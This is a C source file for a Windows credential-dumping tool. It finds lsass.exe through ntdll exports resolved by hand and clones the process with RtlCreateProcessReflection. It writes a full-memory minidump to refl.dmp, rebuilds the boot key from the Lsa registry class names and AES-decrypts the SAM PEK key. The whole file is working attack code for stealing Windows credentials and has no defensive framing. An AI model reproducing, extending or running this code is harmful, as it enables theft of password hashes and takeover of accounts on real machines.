#include "lsass.h"
#include "gate.h"
#include <dbghelp.h>
#include <errhandlingapi.h>
#include <processthreadsapi.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
// #include <wdm.h>
#include "gate.h"
#include "token.h"
#include <aes.h>
#include <sddl.h>
#include <tlhelp32.h>
#include <windows.h>
#include <winnt.h>

#define InitializeObjectAttributes(p)                                          \
  (p)->Length = sizeof(OBJECT_ATTRIBUTES);                                     \
  (p)->RootDirectory = NULL;                                                   \
  (p)->Attributes = 0;                                                         \
  (p)->ObjectName = NULL;                                                      \
  (p)->SecurityDescriptor = NULL;                                              \
  (p)->SecurityQualityOfService = NULL;

int domain_account_f_unmarshal(domain_account_f *self, const uint8_t *data,
                               size_t data_len) {
  if (data_len < 104) {
    fprintf(stderr, "Not enough data to unmarshal a DOMAIN_ACCOUNT_F\n");
    return -1;
  }

  self->Revision = read_le16(data + 0);
  self->CreationTime = read_le64(data + 8);
  self->DomainModifiedAccount = read_le64(data + 16);
  self->MaxPasswordAge = read_le64(data + 24);
  self->MinPasswordAge = read_le64(data + 32);
  self->ForceLogoff = read_le64(data + 40);
  self->LockoutDuration = read_le64(data + 48);
  self->LockoutObservationWindow = read_le64(data + 56);
  self->ModifiedCountAtLastPromotion = read_le64(data + 64);
  self->NextRid = read_le32(data + 72);
  self->PasswordProperties = read_le32(data + 76);
  self->MinPasswordLength = read_le16(data + 80);
  self->PasswordHistoryLength = read_le16(data + 82);
  self->LockoutThreshold = read_le16(data + 84);
  self->ServerState = read_le32(data + 88);
  self->ServerRole = read_le32(data + 92);
  self->UasCompatibilityRequired = read_le32(data + 96);

  self->Data = NULL;
  self->DataLen = 0;

  if (data_len > 104) {
    self->DataLen = data_len - 104;
    self->Data = malloc(self->DataLen);
    if (!self->Data) {
      fprintf(stderr, "Failed to allocate memory for Data\n");
      return -1;
    }
    memcpy(self->Data, data + 104, self->DataLen);
  }

  return 0;
}

void domain_account_f_free(domain_account_f *self) {
  free(self->Data);
  self->Data = NULL;
  self->DataLen = 0;
}

// locate lsass
HANDLE Find() {
  HANDLE procFound = NULL;
  WCHAR *procname = L"lsass.exe";
  size_t ntdll = get_mod_base("ntdll.dll");
  PVOID buffer = NULL;
  DWORD bufSize = 0;

  const void *queryInfoPtr =
      get_function_from_exports(ntdll, "NtQuerySystemInformation");
  NtQuerySystemInformation_t NtQuerySystemInformation =
      (NtQuerySystemInformation_t)queryInfoPtr;
  const void *allocVirtPtr =
      get_function_from_exports(ntdll, "NtAllocateVirtualMemory");
  NtAllocateVirtualMemory_t NtAllocateVirtualMemory =
      (NtAllocateVirtualMemory_t)allocVirtPtr;
  const void *freeVirtPtr =
      get_function_from_exports(ntdll, "NtFreeVirtualMemory");
  NtFreeVirtualMemory_t NtFreeVirtualMemory =
      (NtFreeVirtualMemory_t)freeVirtPtr;

  NTSTATUS status =
      NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)5, 0, 0, &bufSize);
  if (bufSize == 0) {
    return NULL;
  }
  size_t bufSizeT = (size_t)bufSize;
  status = NtAllocateVirtualMemory(GetCurrentProcess(), &buffer, 0, &bufSizeT,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!status) {
    SYSTEM_PROCESS_INFORMATION *sysproc_info =
        (SYSTEM_PROCESS_INFORMATION *)buffer;
    if (!NtQuerySystemInformation(
            (SYSTEM_INFORMATION_CLASS)SystemProcessInformation, buffer, bufSize,
            &bufSize)) {
      while (TRUE) { // query process info
        if (lstrcmpiW(procname, sysproc_info->ImageName.Buffer) == 0) {
          procFound = sysproc_info->UniqueProcessId;
          break;
        }
        if (!sysproc_info->NextEntryOffset) {
          break;
        }
        sysproc_info =
            (SYSTEM_PROCESS_INFORMATION *)((ULONG_PTR)sysproc_info +
                                           sysproc_info->NextEntryOffset);
      }
    }

  } else {
    printf("failed to allocate virtual memory: 0x%08lX\n", status);
    return procFound;
  }
  NtFreeVirtualMemory(GetCurrentProcess(), &buffer, &bufSizeT, MEM_RELEASE);

  return procFound;
}

// reference:
// https://gist.github.com/GeneralTesler/68903f7eb00f047d32a4d6c55da5a05c
typedef struct {
  HANDLE orig_hndl;
  HANDLE returned_hndl;
  DWORD returned_pid;
  BOOL is_ok;
  NTSTATUS(NTAPI *pNtTerminateProcess)(HANDLE, NTSTATUS);
} t_refl_args;

size_t ntdll;
RtlCreateProcessReflection_t RtlCreateProcessReflection = NULL;

DWORD WINAPI refl_creator(LPVOID lpParam) {
  t_refl_args *args = (t_refl_args *)lpParam;
  if (!args)
    return 1;
  args->is_ok = FALSE;

  RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = {0};
  NTSTATUS ret = RtlCreateProcessReflection(
      args->orig_hndl, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES, NULL, NULL,
      NULL, &info);

  if (ret == 0xC0000350) {
    // inside clone — only raw Nt call, no loader contact
    args->pNtTerminateProcess((HANDLE)-1, 0);
    for (;;)
      ;
  }

  if (ret == 0) {
    args->is_ok = TRUE;
    args->returned_hndl = info.ReflectionProcessHandle;
    args->returned_pid =
        (DWORD)(uintptr_t)info.ReflectionClientId.UniqueProcess;
  } else {
    printf("RtlCreateProcessReflection failed: 0x%X\n", ret);
  }

  return ret;
}

NTSTATUS Clone(HANDLE pid) {
  ntdll = get_mod_base("ntdll.dll");

  RtlCreateProcessReflection =
      (RtlCreateProcessReflection_t)get_function_from_exports(
          ntdll, "RtlCreateProcessReflection");
  NtOpenProcess_t NtOpenProcess =
      (NtOpenProcess_t)get_function_from_exports(ntdll, "NtOpenProcess");

  // resolve PID from input handle
  DWORD lsassPID = (DWORD)(uintptr_t)pid;
  if (lsassPID == 0) {
    printf("invalid PID\n");
    return 1;
  }

  OBJECT_ATTRIBUTES obj;
  CLIENT_ID cid;
  cid.UniqueProcess = pid;
  cid.UniqueThread = NULL;
  InitializeObjectAttributes(&obj);
  HANDLE newLass;
  NTSTATUS status = NtOpenProcess(&newLass, PROCESS_ALL_ACCESS, &obj, &cid);
  // HANDLE newLass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPID);
  if (!newLass) {
    printf("OpenProcess failed: %d\n", GetLastError());
    return 1;
  }
  printf("got handle: %p for PID: %d\n", newLass, lsassPID);

  HANDLE outFile = CreateFileA("refl.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_NORMAL, NULL);

  t_refl_args args = {0};
  args.orig_hndl = newLass;
  args.pNtTerminateProcess =
      (NTSTATUS(NTAPI *)(HANDLE, NTSTATUS))GetProcAddress(
          GetModuleHandleA("ntdll.dll"), "NtTerminateProcess");

  if (!args.pNtTerminateProcess) {
    printf("failed to resolve NtTerminateProcess\n");
    return 1;
  }

  // must run in dedicated thread — RtlCreateProcessReflection forks it
  HANDLE hThread = CreateThread(NULL, 0, refl_creator, &args, 0, NULL);
  if (!hThread) {
    printf("CreateThread failed: %d\n", GetLastError());
    return 1;
  }

  DWORD wait = WaitForSingleObject(hThread, 20000);
  CloseHandle(hThread);

  if (wait == WAIT_TIMEOUT) {
    printf("timed out waiting for reflection\n");
    CloseHandle(outFile);
    CloseHandle(newLass);
    return 1;
  }

  CloseHandle(newLass);

  if (!args.is_ok || args.returned_pid == 0) {
    printf("failed to clone\n");
    CloseHandle(outFile);
    return 1;
  }

  printf("clone PID: %d\n", args.returned_pid);

  BOOL dumped =
      MiniDumpWriteDump(args.returned_hndl, args.returned_pid, outFile,
                        MiniDumpWithFullMemory, NULL, NULL, NULL);

  if (!dumped)
    printf("MiniDumpWriteDump failed: %d\n", GetLastError());
  else
    printf("dump written to refl.dmp\n");

  CloseHandle(outFile);
  TerminateProcess(args.returned_hndl, 0);
  CloseHandle(args.returned_hndl);
  return dumped ? 0 : 1;
}

#define OBJ_CASE_INSENSITIVE 0x00000040L

void bytes_to_hex(unsigned char *src, size_t len, char *dest) {
  for (size_t i = 0; i < len; i++) {
    // %02X ensures a leading zero for values < 16
    sprintf(dest + (i * 2), "%02X", src[i]);
  }
  dest[len * 2] = '\0'; // Null-terminate the final string
}

NTSTATUS DumpLsa(HANDLE pid) {
  ntdll = get_mod_base("ntdll.dll");
  NTSTATUS status;
  NtOpenProcess_t NtOpenProcess =
      (NtOpenProcess_t)get_function_from_exports(ntdll, "NtOpenProcess");
  // prepare object attributes
  OBJECT_ATTRIBUTES obj;
  CLIENT_ID cid;
  HANDLE lsassProcessHandle;
  cid.UniqueProcess = pid;
  cid.UniqueThread = NULL;
  InitializeObjectAttributes(&obj);
  status = NtOpenProcess(&lsassProcessHandle, PROCESS_ALL_ACCESS, &obj, &cid);
  if (status != 0) {

    return status;
  }
  HANDLE outFile =
      CreateFileA("refl.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS,
                  FILE_ATTRIBUTE_NORMAL, NULL); // create a dump file.

  DWORD lsassPid = GetProcessId(lsassProcessHandle);
  BOOL dumped = MiniDumpWriteDump(lsassProcessHandle, lsassPid, outFile,
                                  MiniDumpWithFullMemory, NULL, NULL, NULL);

  return status;
}

const int MAXREGVAL = 1024;

UINT8 *ExtractSysKey() {
  static UINT8 result[16];
  UINT8 scrambled[16];
  int scrambled_len = 0;
  UINT8 p[16] = {0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3,
                 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7};
  HANDLE key;
  ntdll = get_mod_base("ntdll.dll");
  NtOpenKey_t NtOpenKey =
      (NtOpenKey_t)get_function_from_exports(ntdll, "NtOpenKey");
  RtlInitUnicodeString_t RtlInitUnicodeString =
      (RtlInitUnicodeString_t)get_function_from_exports(ntdll,
                                                        "RtlInitUnicodeString");
  NtQueryKey_t NtQueryKey =
      (NtQueryKey_t)get_function_from_exports(ntdll, "NtQueryKey");
  NtClose_t NtClose = (NtClose_t)get_function_from_exports(ntdll, "NtClose");

  if (!NtOpenKey || !RtlInitUnicodeString || !NtQueryKey || !NtClose) {
    printf("failed to resolve ntdll exports\n");
    return NULL;
  }

  UNICODE_STRING lsa;
  RtlInitUnicodeString(
      &lsa, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Lsa");
  OBJECT_ATTRIBUTES objAttr;
  objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
  objAttr.RootDirectory = NULL;
  objAttr.ObjectName = &lsa;
  objAttr.Attributes = OBJ_CASE_INSENSITIVE;
  objAttr.SecurityDescriptor = NULL;
  objAttr.SecurityQualityOfService = NULL;
  NTSTATUS err = NtOpenKey(&key, 0x00001 | 0x20019, &objAttr);
  if (err != 0) {
    printf("error opening Lsa key: 0x%X\n", err);
    return NULL;
  }

  wchar_t *names[] = {L"JD", L"Skew1", L"GBG", L"Data"};
  for (int i = 0; i < sizeof(names) / sizeof(names[0]); i++) {
    HANDLE subKey;
    OBJECT_ATTRIBUTES subObjAttr;
    UNICODE_STRING sKeyStr;
    RtlInitUnicodeString(&sKeyStr, names[i]);
    subObjAttr.Length = sizeof(OBJECT_ATTRIBUTES);
    subObjAttr.RootDirectory = key;
    subObjAttr.ObjectName = &sKeyStr;
    subObjAttr.Attributes = OBJ_CASE_INSENSITIVE;
    subObjAttr.SecurityDescriptor = NULL;
    subObjAttr.SecurityQualityOfService = NULL;
    err = NtOpenKey(&subKey, 0x00001 | 0x20019, &subObjAttr);
    if (err != 0) {
      printf("error opening %ls: %X\n", names[i], err);
      NtClose(key);
      return NULL;
    }

    // use RegQueryInfoKeyW directly — avoids KEY_FULL_INFORMATION layout issues
    WCHAR classBuf[MAXREGVAL];
    DWORD classLen = MAXREGVAL;
    DWORD subKeyCount, maxSubKeyLen, maxClassLen, valueCount, maxValueNameLen,
        maxValueLen, secDescLen;
    FILETIME lastWrite;

    LONG ret = RegQueryInfoKeyW((HKEY)subKey, classBuf, &classLen, NULL,
                                &subKeyCount, &maxSubKeyLen, &maxClassLen,
                                &valueCount, &maxValueNameLen, &maxValueLen,
                                &secDescLen, &lastWrite);

    if (ret != ERROR_SUCCESS) {
      printf("RegQueryInfoKeyW failed for %ls: %d\n", names[i], ret);
      NtClose(subKey);
      NtClose(key);
      return NULL;
    }

    printf("class for %ls: %ls (%d chars)\n", names[i], classBuf, classLen);

    // decode hex string into bytes, 2 wchars per byte
    for (DWORD j = 0; j < classLen / 2; j++) {
      WCHAR tmp[3] = {classBuf[j * 2], classBuf[j * 2 + 1], 0};
      scrambled[scrambled_len++] = (UINT8)wcstoul(tmp, NULL, 16);
    }

    NtClose(subKey);
  }

  NtClose(key);

  if (scrambled_len != 16) {
    printf("bad scrambled len: %d\n", scrambled_len);
    return NULL;
  }

  // match Go: result[i] = scrambled[p[i]]
  for (int i = 0; i < 16; i++) {
    result[i] = scrambled[p[i]];
  }

  const int resultSize = 16;
  char hexStr[33];
  bytes_to_hex(result, resultSize, hexStr);
  printf("syskey: %s\n", hexStr);

  return result;
}

UINT8 *ExtractPEKKey(UINT8 *bootkey) {
  HANDLE key;
  UINT8 *PEKKey;
  ntdll = get_mod_base("ntdll.dll");
  NtOpenKey_t NtOpenKey =
      (NtOpenKey_t)get_function_from_exports(ntdll, "NtOpenKey");
  RtlInitUnicodeString_t RtlInitUnicodeString =
      (RtlInitUnicodeString_t)get_function_from_exports(ntdll,
                                                        "RtlInitUnicodeString");
  NtQueryKey_t NtQueryKey =
      (NtQueryKey_t)get_function_from_exports(ntdll, "NtQueryKey");
  NtClose_t NtClose = (NtClose_t)get_function_from_exports(ntdll, "NtClose");
  NtQueryValueKey_t NtQueryValueKey =
      (NtQueryValueKey_t)get_function_from_exports(ntdll, "NtQueryValueKey");

  if (!NtOpenKey || !RtlInitUnicodeString || !NtQueryKey || !NtClose ||
      !NtQueryKey) {
    printf("failed to resolve ntdll exports\n");
    return NULL;
  }
  UNICODE_STRING syskeyStr;

  RtlInitUnicodeString(&syskeyStr,
                       L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account");
  OBJECT_ATTRIBUTES objAttr;
  objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
  objAttr.RootDirectory = NULL;
  objAttr.ObjectName = &syskeyStr;
  objAttr.Attributes = OBJ_CASE_INSENSITIVE;
  objAttr.SecurityDescriptor = NULL;
  objAttr.SecurityQualityOfService = NULL;

  NTSTATUS err = NtOpenKey(&key, KEY_READ, &objAttr);
  if (err != 0) {
    printf("cannot open key: 0x%X\n", err);
    return PEKKey;
  }
  UNICODE_STRING valueName;
  RtlInitUnicodeString(&valueName, L"F");

  BYTE buf[4096];
  ULONG resultLen = 0;

  err = NtQueryValueKey(key, &valueName, 2, buf, sizeof(buf), &resultLen);
  NtClose(key);
  if (err != 0) {
    printf("NtQueryValueKey failed: 0x%X\n", err);
    return NULL;
  }
  KEY_VALUE_PARTIAL_INFORMATION *kvpi = (KEY_VALUE_PARTIAL_INFORMATION *)buf;
  BYTE *valueData = kvpi->Data;
  ULONG valueDataLen = kvpi->DataLength;
  sam_key_data_aes samAESData;
  domain_account_f account_f;
  domain_account_f_unmarshal(&account_f, valueData, valueDataLen);
  memcpy(&samAESData, account_f.Data, sizeof(samAESData));
  BYTE *PEKKeyIV = samAESData.Salt;
  BYTE *encSysKey = malloc(samAESData.DataLen);
  memcpy(encSysKey, samAESData.Data, samAESData.DataLen);
  printf("revision: %u\n", account_f.Revision);
  struct AES_ctx ctx;

  uint8_t *aeskey = (uint8_t *)bootkey;
  uint8_t *keyIV = (uint8_t *)PEKKeyIV;

  AES_init_ctx_iv(&ctx, aeskey, keyIV);

  uint8_t plaintext[sizeof(samAESData.Data)];

  memcpy(plaintext, samAESData.Data, sizeof(samAESData.Data));

  AES_CBC_decrypt_buffer(&ctx, plaintext, sizeof(samAESData.Data));

  PEKKey = (UINT8 *)plaintext;
  char hexStr[sizeof(plaintext) * 2 + 1];
  bytes_to_hex(PEKKey, 16, hexStr);
  printf("PEK key: %s\n", hexStr);

  return PEKKey;
}
